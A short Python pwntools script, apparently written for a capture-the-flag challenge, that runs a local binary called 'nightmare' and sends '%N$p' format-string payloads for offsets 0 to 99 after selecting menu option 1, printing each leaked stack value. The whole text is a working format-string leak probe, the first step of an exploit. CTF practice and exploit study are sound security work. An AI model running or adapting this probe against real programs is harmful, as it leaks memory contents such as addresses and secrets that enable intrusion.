from pwn import * 

elf = context.binary = ELF("./nightmare", checksec=False)

for i in range(100):
    try:
        p = process(level = "error")
        p.sendlineafter('>', '1')
        p.sendlineafter('>', "%{}$p".format(i))
        p.recvuntil('> ')
        result = p.recvline()
        print(str(i), ":", str(result))
        p.close()
    except EOFError:
        pass
